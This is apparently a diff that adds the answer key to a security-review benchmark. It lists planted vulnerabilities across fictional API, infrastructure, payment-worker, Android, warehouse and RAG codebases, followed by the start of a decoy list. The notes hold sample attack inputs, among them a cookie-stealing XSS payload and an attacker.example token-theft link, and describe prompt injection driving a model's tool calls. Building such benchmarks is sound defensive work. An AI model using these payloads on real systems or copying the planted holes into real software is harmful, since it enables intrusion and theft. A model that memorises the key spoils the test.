@@ -1,0 +1,898 @@
+{
+  "planted": [
+    {
+      "id": "AA-01",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/routes/attachments.ts",
+      "symbol": "router.get('/:id/raw')",
+      "line": 97,
+      "cwe": "CWE-306",
+      "class": "Missing authentication on a data-serving route",
+      "kind": "composition",
+      "mechanism": "guard predicate vs mount point",
+      "domain": "web-api",
+      "requires_files": [
+        "fieldops-api/src/index.ts",
+        "fieldops-api/src/routes/attachments.ts",
+        "fieldops-api/src/config.ts"
+      ],
+      "note": "index.ts:28 puts requireAuth on /api/v1/*, but the same attachments router is mounted a second time at config.legacyFilesMount ('/files', config.ts:32) behind attachActor, which never rejects. Both attachment handlers gate on `if (actor && actor.orgId !== row.orgId)` (lines 80 and 97), so with no actor the tenancy check is skipped entirely: GET /files/<uuid>/raw streams any org's attachment bytes with no credential at all."
+    },
+    {
+      "id": "AA-02",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/routes/session.ts",
+      "symbol": "POST /session/token (password grant)",
+      "line": 87,
+      "cwe": "CWE-307",
+      "class": "Improper restriction of excessive authentication attempts",
+      "kind": "composition",
+      "mechanism": "rate limit scoped past credential endpoint",
+      "domain": "web-api",
+      "requires_files": [
+        "fieldops-api/src/index.ts",
+        "fieldops-api/src/routes/session.ts",
+        "fieldops-api/src/middleware/rateLimit.ts"
+      ],
+      "note": "index.ts:24 mounts loginLimiter on the exact path '/api/v1/session/login' only. session.ts exposes two sibling credential paths on the same router: /session/token with grantType 'password' (line 87, same findPrincipal + passwordMatches pair as /login) and /session/recover (line 111, an unlimited account-existence oracle and mail bomb). Neither is covered, so password guessing just moves one path over."
+    },
+    {
+      "id": "AA-03",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/lib/cache.ts",
+      "symbol": "listKey",
+      "line": 12,
+      "cwe": "CWE-524",
+      "class": "Cross-role data exposure through a shared cache",
+      "kind": "composition",
+      "mechanism": "cache key omits authorization scope",
+      "domain": "web-api",
+      "requires_files": [
+        "fieldops-api/src/lib/cache.ts",
+        "fieldops-api/src/routes/workorders.ts",
+        "fieldops-api/src/lib/policy.ts"
+      ],
+      "note": "The list response is narrowed per caller: policy.ts:47 visibleCrewFilter returns the actor's crews for role 'tech' and null (whole org board) for dispatcher/manager, and workorders.ts:66-70 applies that as a SQL predicate. The cache key is org + status + page only, so a manager's unnarrowed page is stored and then served on a tech's cache hit (workorders.ts:53-58), and vice versa. A tech reads every crew's work orders in the org."
+    },
+    {
+      "id": "AA-04",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/routes/workorders.ts",
+      "symbol": "router.patch('/:id')",
+      "line": 136,
+      "cwe": "CWE-639",
+      "class": "Authorization bypass through user-controlled key",
+      "kind": "single-file",
+      "mechanism": "create-checked but not update-checked",
+      "domain": "web-api",
+      "requires_files": ["fieldops-api/src/routes/workorders.ts"],
+      "note": "POST runs both gates: sameOrgSite (line 89) and canWriteSite (line 92, the crew clearance check). PATCH re-checks only sameOrgSite (line 133) before writing the new site_id at line 136. A dispatcher cleared for crew-north (org-4:site-101/102) creates an order there, then PATCHes siteId to org-4:site-900 — the contract crew's site they were never cleared for."
+    },
+    {
+      "id": "AA-05",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/routes/workorders.ts",
+      "symbol": "router.get('/:id/print')",
+      "line": 197,
+      "cwe": "CWE-79",
+      "class": "Stored cross-site scripting",
+      "kind": "composition",
+      "mechanism": "sanitised at wrong layer",
+      "domain": "web-api",
+      "requires_files": [
+        "fieldops-api/src/routes/workorders.ts",
+        "fieldops-api/src/lib/policy.ts"
+      ],
+      "note": "Notes are 'sanitised' once at ingest by policy.ts:57 scrubNotes, which only strips <script>/<iframe>/javascript:. The print sheet escapes id, title, siteId and status with escapeHtml but interpolates wo.notes raw at line 197. A note of `<img src=x onerror=fetch('//x/'+document.cookie)>` survives scrubNotes untouched and executes for every dispatcher who prints the order."
+    },
+    {
+      "id": "AA-06",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/middleware/auth.ts",
+      "symbol": "requireAuth",
+      "line": 60,
+      "cwe": "CWE-290",
+      "class": "Authentication bypass by spoofing",
+      "kind": "composition",
+      "mechanism": "permission from unstripped proxy header",
+      "domain": "web-api",
+      "requires_files": [
+        "fieldops-api/src/middleware/auth.ts",
+        "fieldops-api/src/config.ts"
+      ],
+      "note": "config.ts:28 turns trustProxyIdentity on whenever NODE_ENV is 'production' — i.e. exactly in the deployed stacks. requireAuth then falls back to fromProxyHeaders (line 60), taking id, org, role and crews verbatim from client-controllable x-fieldops-* request headers. Any unauthenticated caller sends `x-fieldops-actor: x` plus `x-fieldops-role: admin` and is an admin of any org they name. See AA-10: nothing at the load balancer removes those headers."
+    },
+    {
+      "id": "AA-07",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/edge.ts",
+      "symbol": "${env}-rule-internal listener rule",
+      "line": 130,
+      "cwe": "CWE-306",
+      "class": "Missing authentication on an administrative surface",
+      "kind": "single-file",
+      "mechanism": "guard predicate vs mount point",
+      "domain": "infra",
+      "requires_files": ["pulumi-platform/edge.ts"],
+      "note": "The dispatch console has no login of its own — the listener's authenticate-oidc action is its only authentication (rule ${env}-rule-console, priority 20, path /console/*). Priority 30 forwards /internal/* to the same consoleTargetGroup with a bare forward action, so the whole console is reachable unauthenticated by swapping the path prefix. Contrast the /ops/* rule at line 139, which is covered by the WAF rule at line 161."
+    },
+    {
+      "id": "AA-08",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/storage.ts",
+      "symbol": "${env}-exports-policy",
+      "line": 60,
+      "cwe": "CWE-732",
+      "class": "World-readable object storage holding production data",
+      "kind": "composition",
+      "mechanism": "feature-flag/env selector",
+      "domain": "infra",
+      "requires_files": [
+        "pulumi-platform/storage.ts",
+        "pulumi-platform/Pulumi.staging.yaml",
+        "pulumi-platform/index.ts"
+      ],
+      "note": "Pulumi.staging.yaml:9 sets publicExports true, which drops all four BucketPublicAccessBlock switches (storage.ts:44-47) and attaches a Principal:'*' s3:GetObject policy (line 60). The same stack file sets replicateProdExports true (line 12), and storage.ts:70-90 accepts inbound replication of the production export objects into that very bucket. The flag reads like 'staging is fake data'; the sibling flag makes it production work-order and billing exports, anonymously readable."
+    },
+    {
+      "id": "AA-09",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/storage.ts",
+      "symbol": "${env}-reports-policy / PartnerDirectRead",
+      "line": 123,
+      "cwe": "CWE-732",
+      "class": "Edge-only access control bypassed at the origin",
+      "kind": "composition",
+      "mechanism": "ACL at one layer while another is directly reachable",
+      "domain": "infra",
+      "requires_files": [
+        "pulumi-platform/storage.ts",
+        "pulumi-platform/edge.ts"
+      ],
+      "note": "The staff-only working material under the reports bucket's internal/ prefix is protected by a CloudFront WAF rule that blocks URI paths starting with /internal/ (edge.ts:217-226). The bucket policy then grants the partner analytics role s3:GetObject and s3:ListBucket on `${arn}/*` — the whole bucket, internal/ included — with an explicit note that the partner reads objects directly rather than through the distribution. The one control that enforces the prefix restriction is the one layer the partner does not go through."
+    },
+    {
+      "id": "AA-10",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/edge.ts",
+      "symbol": "${env}-alb loadBalancer attributes",
+      "line": 35,
+      "cwe": "CWE-290",
+      "class": "Trusted identity header accepted from the internet",
+      "kind": "composition",
+      "mechanism": "permission from unstripped proxy header",
+      "domain": "infra",
+      "requires_files": [
+        "pulumi-platform/edge.ts",
+        "fieldops-api/src/middleware/auth.ts",
+        "fieldops-api/src/config.ts"
+      ],
+      "note": "dropInvalidHeaderFields is set false with a comment stating the client-certificate identity 'reaches us as x-fieldops-* headers', and no listener rule, WAF rule or Lambda@Edge removes those headers from inbound requests. The API's requireAuth (fieldops-api/src/middleware/auth.ts:60) consumes exactly those header names as an authenticated principal whenever NODE_ENV is production. The infra half is what turns AA-06 from a latent misdesign into an unauthenticated admin path."
+    },
+    {
+      "id": "AA-11",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/iam.ts",
+      "symbol": "createRoles",
+      "line": 80,
+      "cwe": "CWE-732",
+      "class": "Over-privileged service role from a defaulting lookup",
+      "kind": "single-file",
+      "mechanism": "default/lookup decides permission",
+      "domain": "infra",
+      "requires_files": ["pulumi-platform/iam.ts"],
+      "note": "SERVICE_POLICIES has entries for fieldops-api, reports-renderer and warehouse-loader. SERVICES (line 49) iterates four names — 'settlement-worker' has no entry — and the lookup falls through to BOOTSTRAP_STATEMENTS, which is `Action: '*', Resource: '*'`. The settlement worker task role is account-wide administrator, and the same silent fallback applies to every workload added to SERVICES from now on."
+    },
+    {
+      "id": "AA-12",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/data.ts",
+      "symbol": "${env}-db-analytics-ingress",
+      "line": 76,
+      "cwe": "CWE-284",
+      "class": "Database exposed to the internet",
+      "kind": "composition",
+      "mechanism": "second writer bypasses invariant",
+      "domain": "infra",
+      "requires_files": [
+        "pulumi-platform/data.ts",
+        "pulumi-platform/network.ts"
+      ],
+      "note": "network.ts:97-110 defines dbSecurityGroup with a single ingress rule sourced from appSecurityGroup — 'Postgres is reachable from the application tier and from nowhere else'. data.ts attaches a second, standalone SecurityGroupIngressRule to that same group opening 5432 to 0.0.0.0/0, and puts the analytics replica on the public subnets (line 55) with publiclyAccessible true (line 64). The invariant is stated in one file and revoked from another; the replica endpoint is directly dialable from the internet."
+    },
+    {
+      "id": "AA-13",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/handlers.py",
+      "symbol": "_apply_payout",
+      "line": 44,
+      "cwe": "CWE-20",
+      "class": "Unvalidated message drives money movement",
+      "kind": "composition",
+      "mechanism": "schema validates the request but not the consumed message",
+      "domain": "worker",
+      "requires_files": [
+        "settlement-worker/settlement/handlers.py",
+        "settlement-worker/settlement/consumer.py",
+        "settlement-worker/settlement/schemas.py"
+      ],
+      "note": "The publish side is fully checked: PayoutRequest bounds amount_cents to 0 < n <= 5_000_000 (schemas.py:27) and publish_payout additionally proves the destination is registered to the tenant (consumer.py:57). The consume side never reconstructs the model — decode() returns a bare json.loads dict (consumer.py:74) and _apply_payout takes int(msg['amount_cents']) with no bound and msg['destination_account'] with no ownership check. LedgerEntry's amount_cents is a plain int, so any producer with stream write access (the partner intake service, the reconciliation job, anything holding the Redis credential) can post a negative or arbitrarily large payout to any well-formed account id."
+    },
+    {
+      "id": "AA-14",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/retry.py",
+      "symbol": "replay_dead_letters",
+      "line": 43,
+      "cwe": "CWE-862",
+      "class": "Missing authorization on the replay path",
+      "kind": "composition",
+      "mechanism": "retry/bulk path skips validator",
+      "domain": "worker",
+      "requires_files": [
+        "settlement-worker/settlement/retry.py",
+        "settlement-worker/settlement/handlers.py"
+      ],
+      "note": "The normal path is handlers.handle_payout, which calls _require_scope (handlers.py:78) and consults the idempotency slot before applying anything. The drain calls handlers._apply_payout directly, so a dead-lettered entry is re-applied with no scope check, no idempotency guard and — because it reads entry['body'] itself rather than going through consumer.decode — no producer signature check either. Anything that can land an entry in the dead-letter stream gets its payout applied by the next operator drain."
+    },
+    {
+      "id": "AA-15",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/idempotency.py",
+      "symbol": "slot",
+      "line": 26,
+      "cwe": "CWE-639",
+      "class": "Cross-tenant replay and receipt disclosure",
+      "kind": "composition",
+      "mechanism": "idempotency key lets a second actor replay",
+      "domain": "worker",
+      "requires_files": [
+        "settlement-worker/settlement/idempotency.py",
+        "settlement-worker/settlement/handlers.py"
+      ],
+      "note": "The Redis slot is keyed on the client-chosen idempotency_key alone, with no tenant component, while the value stored is a full receipt containing tenant_id, destination_account, amount_cents and balance_after (handlers.py:66-72). handle_payout returns the cached receipt on any hit (handlers.py:81-84). Tenant B publishing a payout whose idempotency_key matches tenant A's reads back tenant A's receipt — and B's own payout is silently suppressed, so the key is also a denial primitive against a competitor's settlements."
+    },
+    {
+      "id": "AA-16",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/reconcile.py",
+      "symbol": "apply_adjustment",
+      "line": 56,
+      "cwe": "CWE-841",
+      "class": "Business-logic invariant bypassed by a second writer",
+      "kind": "composition",
+      "mechanism": "second writer bypasses invariant",
+      "domain": "worker",
+      "requires_files": [
+        "settlement-worker/settlement/reconcile.py",
+        "settlement-worker/settlement/ledger.py"
+      ],
+      "note": "ledger.post_entry is the guarded writer: it WATCHes the balance key and raises InsufficientFunds rather than leave an account negative (ledger.py:65-69). Reconciliation writes the same Redis key with a plain SET, taking the figure straight from the CSV statement — no overdraft check, no WATCH (so it also clobbers a concurrent post_entry), and the journal row it writes is a bare insert. Anyone who can influence the nightly statement file sets any tenant's balance to any number."
+    },
+    {
+      "id": "AA-17",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/handlers.py",
+      "symbol": "handle_payout_reissue",
+      "line": 107,
+      "cwe": "CWE-862",
+      "class": "Missing authorization on one handler",
+      "kind": "single-file",
+      "mechanism": "middleware scope misses siblings",
+      "domain": "worker",
+      "requires_files": ["settlement-worker/settlement/handlers.py"],
+      "note": "handle_payout (line 78), handle_payout_cancel (line 92) and handle_refund (line 115) each open with _require_scope. handle_payout_reissue goes straight to _apply_payout with no scope check at all, and it is a fully wired message type in consumer.HANDLERS. Any actor who can publish a message with type 'payout.reissue' moves money without holding payouts:write."
+    },
+    {
+      "id": "AA-18",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/settings.py",
+      "symbol": "Settings.verify_producer_signature",
+      "line": 43,
+      "cwe": "CWE-347",
+      "class": "Producer signature verification disabled by environment",
+      "kind": "composition",
+      "mechanism": "feature-flag/env selector",
+      "domain": "worker",
+      "requires_files": [
+        "settlement-worker/settlement/settings.py",
+        "settlement-worker/settlement/consumer.py"
+      ],
+      "note": "The flag is false whenever APP_ENV is 'staging', and consumer.decode only runs the HMAC comparison when it is true (consumer.py:69-72). The same file puts staging on the same stream and the same consumer group as production (lines 34-35, both defaulted, no env prefix), so a staging worker is a live member of the production consumer group that accepts unsigned entries. Anyone able to XADD to settlement.payouts has their message picked up and applied by whichever staging consumer wins the read."
+    },
+    {
+      "id": "AA-19",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/ui/DeepLinkRouter.kt",
+      "symbol": "routeWeb",
+      "line": 62,
+      "cwe": "CWE-939",
+      "class": "Improper authorization in a URL-scheme handler",
+      "kind": "composition",
+      "mechanism": "guard predicate vs mount point",
+      "domain": "client",
+      "requires_files": [
+        "atlas-android/app/src/main/AndroidManifest.xml",
+        "atlas-android/app/src/main/java/co/atlas/field/ui/DeepLinkRouter.kt",
+        "atlas-android/app/src/main/java/co/atlas/field/ui/ReportWebViewActivity.kt"
+      ],
+      "note": "The atlas:// branch validates uri.host against ALLOWED_HOSTS (line 42). The https intent-filter in the manifest (line 51) declares a scheme and a pathPrefix but no android:host, so it matches /r/ on any domain — and routeWeb applies no host check at all, handing a caller-chosen `target` query parameter to the WebView. Because that WebView carries a JavascriptInterface exposing the bearer (ReportWebViewActivity.kt:57 and 101), `https://attacker.example/r/x?target=https://attacker.example/steal` yields the session token to a page the attacker controls."
+    },
+    {
+      "id": "AA-20",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/sync/AttachmentSync.kt",
+      "symbol": "AttachmentUploader.upload",
+      "line": 80,
+      "cwe": "CWE-522",
+      "class": "Session token sent to an unverified host",
+      "kind": "composition",
+      "mechanism": "middleware scope misses siblings",
+      "domain": "client",
+      "requires_files": [
+        "atlas-android/app/src/main/java/co/atlas/field/sync/AttachmentSync.kt",
+        "atlas-android/app/src/main/java/co/atlas/field/net/ApiClient.kt",
+        "atlas-android/app/src/main/java/co/atlas/field/net/AuthInterceptor.kt"
+      ],
+      "note": "AuthInterceptor exists precisely so the bearer never leaves BuildConfig.API_HOST (AuthInterceptor.kt:19-21). ApiClient.api installs it (line 49); its sibling ApiClient.uploads (line 57) does not, and also sets followRedirects(true). The uploader then re-adds the Authorization header by hand onto a URL the server response chose. A tampered or compromised /attachments/intent response — or a single 302 from the storage host — walks the session token to an arbitrary origin, and the same client carries the attachment bytes."
+    },
+    {
+      "id": "AA-21",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/data/FeatureGates.kt",
+      "symbol": "isEnabled",
+      "line": 29,
+      "cwe": "CWE-1188",
+      "class": "Permission decided by a fail-open default",
+      "kind": "single-file",
+      "mechanism": "default/lookup decides permission",
+      "domain": "client",
+      "requires_files": ["atlas-android/app/src/main/java/co/atlas/field/data/FeatureGates.kt"],
+      "note": "isEnabled returns true for any flag not in the snapshot, and the very next declarations use it as authorization: canManageCrews() gates the crew administration surface and canReopenClosed() gates editing a closed order. clear() empties the snapshot on sign-out, and update() no-ops when the payload has no 'flags' object, so a tech who signs in against a server that does not send crew_admin — or who simply gets an unparsed refresh — is handed the admin surface. Note demoMode() on line 38 defaults the other way, which is what the rest of the object should have done."
+    },
+    {
+      "id": "AA-22",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/ui/ReportWebViewActivity.kt",
+      "symbol": "renderOffline",
+      "line": 79,
+      "cwe": "CWE-79",
+      "class": "Cross-site scripting into a token-bearing WebView",
+      "kind": "single-file",
+      "mechanism": "sanitised at wrong layer",
+      "domain": "client",
+      "requires_files": ["atlas-android/app/src/main/java/co/atlas/field/ui/ReportWebViewActivity.kt"],
+      "note": "The title is escaped with TextUtils.htmlEncode on the line above; notes are interpolated raw. JavaScript is enabled and a ReportBridge is attached exposing sessionToken() and actorId(), and the document is loaded with loadDataWithBaseURL against the API origin, so injected script also inherits that origin's storage. Work-order notes are attacker-reachable free text (a customer's pasted email), so the offline sheet turns a note into `Atlas.sessionToken()` exfiltration."
+    },
+    {
+      "id": "AA-23",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/net/ApiClient.kt",
+      "symbol": "applyTlsPolicy",
+      "line": 40,
+      "cwe": "CWE-295",
+      "class": "Certificate validation disabled",
+      "kind": "single-file",
+      "mechanism": "feature-flag/env selector",
+      "domain": "client",
+      "requires_files": ["atlas-android/app/src/main/java/co/atlas/field/net/ApiClient.kt"],
+      "note": "When BuildConfig.ALLOW_INSECURE_TLS is set the builder installs an X509TrustManager whose checkServerTrusted is an empty body, plus a hostnameVerifier that returns true, and returns early so the CertificatePinner is never applied. It is applied to both clients. The flag is not debug-only: build.gradle.kts:49 sets it true for the 'staging' build type, which initWith(release), sets isDebuggable false and is what field testers install — so a shipped, non-debuggable build accepts any certificate for the API and for attachment uploads."
+    },
+    {
+      "id": "AA-24",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/sync/AttachmentSync.kt",
+      "symbol": "AttachmentProvider.openFile",
+      "line": 36,
+      "cwe": "CWE-926",
+      "class": "Exported content provider reading arbitrary app-private files",
+      "kind": "composition",
+      "mechanism": "ACL at one layer while another is directly reachable",
+      "domain": "client",
+      "requires_files": [
+        "atlas-android/app/src/main/AndroidManifest.xml",
+        "atlas-android/app/src/main/java/co/atlas/field/sync/AttachmentSync.kt"
+      ],
+      "note": "The manifest declares the provider android:exported=\"true\" with grantUriPermissions and no android:permission, no android:readPermission and no <path-permission> (manifest lines 62-66). The intent was the share-sheet grant model — a per-URI grant handed to one app for one file — but exporting it makes every URI addressable by every installed app without any grant. openFile then builds File(attachmentDir, uri.lastPathSegment) with no normalisation, so a segment of `../databases/atlas.db` or `../shared_prefs/atlas.session.xml` walks out of the attachment directory. Any app on the device reads the app's private storage."
+    },
+    {
+      "id": "AA-25",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/macros/apply_grants.sql",
+      "symbol": "apply_grants",
+      "line": 17,
+      "cwe": "CWE-732",
+      "class": "Sensitive relations granted to PUBLIC",
+      "kind": "single-file",
+      "mechanism": "default/lookup decides permission",
+      "domain": "data",
+      "requires_files": ["warehouse-dbt/macros/apply_grants.sql"],
+      "note": "reader_by_target covers prod, ci and dev; any other target name falls through to the literal 'public'. The macro then runs `grant usage on schema ... to public` and `grant select on <relation> to public` for every model in the project, PII marts included. A new target (a personal profile, a migration target, an analyst's own output) silently makes the whole warehouse world-readable, and because it runs as a post-hook it re-applies on every build."
+    },
+    {
+      "id": "AA-26",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/macros/apply_grants.sql",
+      "symbol": "apply_grants",
+      "line": 25,
+      "cwe": "CWE-863",
+      "class": "Row-level security enforced on reads only",
+      "kind": "composition",
+      "mechanism": "create-checked but not update-checked",
+      "domain": "data",
+      "requires_files": [
+        "warehouse-dbt/macros/apply_grants.sql",
+        "warehouse-dbt/macros/row_security.sql"
+      ],
+      "note": "enable_row_security creates exactly one policy, `for select` (row_security.sql:23), so tenant_id = current_setting('app.tenant_id') constrains reads and nothing else. apply_grants then hands settlement_app and warehouse_loader insert and update on the same relations. Postgres applies no policy to a command the policy does not name, so a session pinned to tenant A can UPDATE tenant B's rows and INSERT rows attributed to any tenant — including into the marts the tenant-facing reports read."
+    },
+    {
+      "id": "AA-27",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/models/exports/partner_extract.sql",
+      "symbol": "partner_extract config",
+      "line": 4,
+      "cwe": "CWE-524",
+      "class": "One shared relation serving many principals",
+      "kind": "composition",
+      "mechanism": "cache key omits authorization scope",
+      "domain": "data",
+      "requires_files": [
+        "warehouse-dbt/models/exports/partner_extract.sql",
+        "warehouse-dbt/dbt_project.yml"
+      ],
+      "note": "The model filters to one partner at build time from the partner_id var (line 30) but materialises into a single fixed relation name — the identity that decides the contents is not in the relation's identity. dbt_project.yml:50 grants select on everything under exports to the group role partner_readers, which every partner is in. Whichever partner's run finished last is the data all of them read, together with customer names, emails and destination accounts."
+    },
+    {
+      "id": "AA-28",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/models/staging/stg_payout_events.sql",
+      "symbol": "stg_payout_events",
+      "line": 68,
+      "cwe": "CWE-359",
+      "class": "PII written past the masking layer",
+      "kind": "composition",
+      "mechanism": "second writer bypasses invariant",
+      "domain": "data",
+      "requires_files": [
+        "warehouse-dbt/models/staging/stg_payout_events.sql",
+        "warehouse-dbt/models/marts/customer_pii_masked.sql",
+        "warehouse-dbt/dbt_project.yml"
+      ],
+      "note": "customer_pii_masked is the declared contract for anything outside the analytics schema, and dim_customer is documented as 'not for direct consumption'. This staging model joins crm.customers and settlement.tenant_accounts and lands customer_email, customer_phone and bank_account_number in cleartext (lines 66-69) — a second, unmasked copy of the same fields. dbt_project.yml:35 grants select on the staging schema to analyst_role, so every analyst reads the raw values the masking mart exists to withhold."
+    },
+    {
+      "id": "AA-29",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/dbt_project.yml",
+      "symbol": "models.warehouse.exports",
+      "line": 45,
+      "cwe": "CWE-862",
+      "class": "Tenant isolation missing on one folder",
+      "kind": "composition",
+      "mechanism": "middleware scope misses siblings",
+      "domain": "data",
+      "requires_files": [
+        "warehouse-dbt/dbt_project.yml",
+        "warehouse-dbt/macros/row_security.sql",
+        "warehouse-dbt/models/exports/partner_extract.sql"
+      ],
+      "note": "staging (line 32) and marts (line 40) both carry `+pre-hook: enable_row_security(this)`. The sibling exports block carries the post-hook and the grants but no pre-hook, so export relations are created without `alter table ... enable row level security` and without the tenant_isolation policy. They carry tenant_id and are granted to partner_readers, so the one folder that leaves the building is the one folder with no row-level constraint on it."
+    },
+    {
+      "id": "AA-30",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/models/marts/customer_pii_masked.sql",
+      "symbol": "customer_pii_masked (full-refresh branch)",
+      "line": 44,
+      "cwe": "CWE-359",
+      "class": "Masking skipped on the rebuild path",
+      "kind": "single-file",
+      "mechanism": "retry/bulk path skips validator",
+      "domain": "data",
+      "requires_files": ["warehouse-dbt/models/marts/customer_pii_masked.sql"],
+      "note": "The incremental branch applies masked_email, masked_phone and masked_account (lines 25-27). The {% else %} branch — the one that runs on --full-refresh, on a new environment, and, per its own comment, whenever the masking policy version changes — selects email, phone and bank_account raw. A full refresh replaces the table, so the relation every downstream consumer is pointed at silently becomes unmasked, and stays unmasked until a row's updated_at moves."
+    },
+    {
+      "id": "AA-31",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/prompt.py",
+      "symbol": "build_messages",
+      "line": 38,
+      "cwe": "CWE-1427",
+      "class": "Indirect prompt injection reaching tool execution",
+      "kind": "composition",
+      "mechanism": "untrusted text crosses prompt/tool boundary",
+      "domain": "ai",
+      "requires_files": [
+        "atlas-rag/ragsvc/prompt.py",
+        "atlas-rag/ragsvc/retriever.py",
+        "atlas-rag/ragsvc/tools.py",
+        "atlas-rag/ragsvc/app.py"
+      ],
+      "note": "Retrieved chunk text is concatenated into the system message — the same role and the same span as the operator instructions — with no delimiting, no escaping and no statement that the context is data. Chunk text is whatever a tenant uploaded or the shared-drive connector swept up (ingest.py), and the instructions immediately above it tell the model to call http_get on links the context points at. app.py:118-127 executes every returned tool call for up to max_tool_turns with no allowlist or confirmation, so a sentence inside an ingested document is an instruction that runs tools with the asking principal's identity."
+    },
+    {
+      "id": "AA-32",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/tools.py",
+      "symbol": "http_get",
+      "line": 24,
+      "cwe": "CWE-918",
+      "class": "Server-side request forgery through a model tool",
+      "kind": "single-file",
+      "mechanism": "untrusted text crosses prompt/tool boundary",
+      "domain": "ai",
+      "requires_files": ["atlas-rag/ragsvc/tools.py"],
+      "note": "The tool fetches whatever URL the model names: no scheme allowlist, no host allowlist, no denial of link-local or RFC1918 addresses, and no redirect restriction. Its own description ('Fetch the contents of a URL referenced by the context') makes the argument a function of untrusted document text. The service runs inside the VPC, so 169.254.169.254 metadata, the internal model gateway and any internal HTTP surface are reachable, and the first 4000 characters come back into the transcript where the next turn can relay them."
+    },
+    {
+      "id": "AA-33",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/ingest.py",
+      "symbol": "consume_manifest",
+      "line": 100,
+      "cwe": "CWE-20",
+      "class": "Retrieval ACL set by an unvalidated message",
+      "kind": "composition",
+      "mechanism": "schema validates the request but not the consumed message",
+      "domain": "ai",
+      "requires_files": [
+        "atlas-rag/ragsvc/ingest.py",
+        "atlas-rag/ragsvc/app.py",
+        "atlas-rag/ragsvc/retriever.py"
+      ],
+      "note": "The HTTP door is tight: DOCUMENT_SCHEMA pins collection to an enum and acl to a pattern, and the tenant is taken from the authenticated principal, never the body (app.py:35-49, 183-192). The manifest door takes tenant_id straight off the entry, skips _assert_collection entirely, and defaults acl to ['*'] when the connector omits it. retriever._acl_allows short-circuits true on '*' (retriever.py:31), so a manifest entry — the connector is a separate service, and /v1/manifest accepts any valid key — pins a document to any tenant and makes it readable by every principal in it."
+    },
+    {
+      "id": "AA-34",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/ingest.py",
+      "symbol": "retry_failed",
+      "line": 135,
+      "cwe": "CWE-359",
+      "class": "Redaction skipped on the retry path",
+      "kind": "composition",
+      "mechanism": "retry/bulk path skips validator",
+      "domain": "ai",
+      "requires_files": [
+        "atlas-rag/ragsvc/ingest.py",
+        "atlas-rag/ragsvc/app.py"
+      ],
+      "note": "Both live paths redact before persisting — ingest_document (line 85) and consume_manifest (line 102) each wrap the text in redact(). The retry path passes row['raw_text'] to _persist_chunks unredacted, and raw_text is by definition the original document that was stored when ingest failed. Card numbers, acct_ references and national ids that redact() exists to strip end up in the chunk table, where they are retrievable by any principal the chunk's ACL admits and are pasted into the model context."
+    },
+    {
+      "id": "AA-35",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/app.py",
+      "symbol": "exchange_token",
+      "line": 204,
+      "cwe": "CWE-307",
+      "class": "Unlimited attempts against a credential endpoint",
+      "kind": "single-file",
+      "mechanism": "rate limit scoped past credential endpoint",
+      "domain": "ai",
+      "requires_files": ["atlas-rag/ragsvc/app.py"],
+      "note": "The only limits.allow call in the service is on /v1/query (line 144), and it buckets per tenant — which requires already holding a key. /v1/token and /v1/keys/rotate (line 222) both take a raw api_key out of the request body, resolve it through _principal_for_key and are reachable with no Authorization header and no limiter. Both are therefore unmetered oracles for guessing an API key, and rotate additionally revokes and reissues on a hit."
+    },
+    {
+      "id": "AA-36",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/app.py",
+      "symbol": "query",
+      "line": 155,
+      "cwe": "CWE-639",
+      "class": "Cross-tenant answer replay",
+      "kind": "composition",
+      "mechanism": "idempotency key lets a second actor replay",
+      "domain": "ai",
+      "requires_files": [
+        "atlas-rag/ragsvc/app.py",
+        "atlas-rag/ragsvc/limits.py"
+      ],
+      "note": "The replay lookup happens after authentication but the slot is keyed on the Idempotency-Key header alone (limits.py:37) with nothing from the principal, and the cached payload is the full answer plus citations plus the tenant_id it was produced for. A second, differently-authenticated caller who sends a colliding key is handed the first tenant's answer and its source_urls verbatim, before retriever.search — and therefore before any ACL check — is ever reached."
+    }
+  ],
+  "decoys": [
+    {
+      "id": "BB-01",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/routes/attachments.ts",
+      "symbol": "router.get('/:id/raw')",
+      "line": 101,
+      "looks_like": "Path traversal: a filesystem read joined from a value carried in the database row",
+      "shape": "constrained-elsewhere",
+      "ruled_out_by": "fieldops-api/src/routes/attachments.ts:51 — storage_key is the only writer of that column and is always `${randomUUID()}.bin`; the uploader's own filename goes to display_name (line 50), never to the path."
+    },
+    {
+      "id": "BB-02",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/routes/workorders.ts",
+      "symbol": "list handler SQL assembly",
+      "line": 72,
